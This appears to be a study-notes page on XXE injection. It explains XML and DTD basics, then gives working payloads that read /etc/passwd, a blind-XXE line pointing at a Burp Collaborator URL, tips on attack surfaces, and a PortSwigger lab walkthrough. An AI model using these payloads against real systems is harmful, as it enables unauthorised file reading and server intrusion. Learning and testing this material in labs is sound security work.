# XXE (XML External Entity)

## What is XXE&#x20;

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.

There are two types of XXE attacks

1. In-band - An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.
2. Out-of-band - An out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

## What is XML

XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.

### XML Basics

#### Why we use XML?

1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.
2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.
3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.
4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesnâ€™t require any conversion when transferred between different systems.

#### Syntax

Every XML document mostly starts with what is known as XML Prolog.

`<?xml version="1.0" encoding="UTF-8"?>`

Above the line is called XML prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a `good practice` to put that line in all your XML documents.

Every XML document must contain a ROOT element. Ex:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```

In the above example the `<mail>` is the ROOT element of that document and `<to>`, `<from>`, `<subject>`, `<text>` are the children elements. If the XML document doesn't have any root element then it would be considered `wrong` or `invalid` XML doc.

Another thing to remember is that XML is a case sensitive language. If a tag starts like `<to>` then it has to end by `</to>` and not by something like `</To>`(notice the capitalization of `T`)

Like HTML we can use attributes in XML too. The syntax for having atributes is also very similar to HTML. Ex:

`<text category = "message">You need to learn about XXE</text>`

In the above example `category` is the attribute name and `message` is the attribute value.

### DTD File

DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.

Let us try to understand this with the help of an example. Say we have a file named `note.dtd` with the following content:

`<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>`

Now we can use this DTD to validate the information of some XML document and make sure that the XML file conforms to the rules of that DTD.

Ex: Below is given an XML document that uses `note.dtd`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note> 
```

So now let's understand how that DTD validates the XML. Here's what all those terms used in `note.dtd` mean

* !DOCTYPE note -  Defines a root element of the document named **note**
* !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
* !ELEMENT to - Defines the `to` element to be of type "#PCDATA"
* !ELEMENT from - Defines the `from` element to be of type "#PCDATA"
* !ELEMENT heading  - Defines the `heading` element to be of type "#PCDATA"
* !ELEMENT body - Defines the `body` element to be of type "#PCDATA"

&#x20;   NOTE: #PCDATA means parseable character data.

## XXE Attacks

* **Exploiting XXE to retrieve files**, where an external entity is defined containing the contents of a file, and returned in the application's response.
* **Exploiting XXE to perform SSRF attacks**, where an external entity is defined based on a URL to a back-end system.
* **Exploiting blind XXE exfiltrate data out-of-band**, where sensitive data is transmitted from the application server to a system that the attacker controls.
* **Exploiting blind XXE to retrieve data via error messages**, where the attacker can trigger a parsing error message containing sensitive data.

## Exploiting XXE to retrieve files

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

* Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.
* Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the `/etc/passwd` file by submitting the following XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck> 
```

This XXE payload defines an external entity `&xxe;` whose value is the contents of the `/etc/passwd` file and uses the entity within the `productId` value. This causes the application's response to include the contents of the file:

```html
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## Exploiting XXE to perofrm SSRF attacks

## XXE Payloads

Defining a `ENTITY` called `name` and assigning it a value `feast`. Later we are using that ENTITY in our code.

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>xml
```

We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

Here again, we are defining an ENTITY with the name `read` but the difference is that we are setting it value to \`SYSTEM\` and path of the file.

## Exploiting XXE Strategy

* Place XML Payloads in input fields and URL parameters i.e. Login forms.
* Upload an XML payload file wherever possible.
* Intercept the request and look for any kind of XML data format.
* Replace found XML content with XML payloads.
* Use Python or Burp Collaborator as a web server to look for Blind XXE
  * `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "burp collaborator URL"> ]`

## Increasing Attack Surface

* SVG is just XML describing images
  * Wherever we can upload an image --> XXE if svg is possible
* DOCX/XLSX can also be used for XXE

* SOAP Requests are also just XML requests

## Examples

### PortSwigger Labs

#### Exploiting XXE using external entities to retrieve files

After selecting the 'Check Stock' button we see the below request body in Developer Tools

```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>20</productId><storeId>1</storeId></stockCheck>
```

Payload Used when editing and resending the request

```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]><stockCheck><productId>&read;</productId><storeId>1</storeId></stockCheck>
```
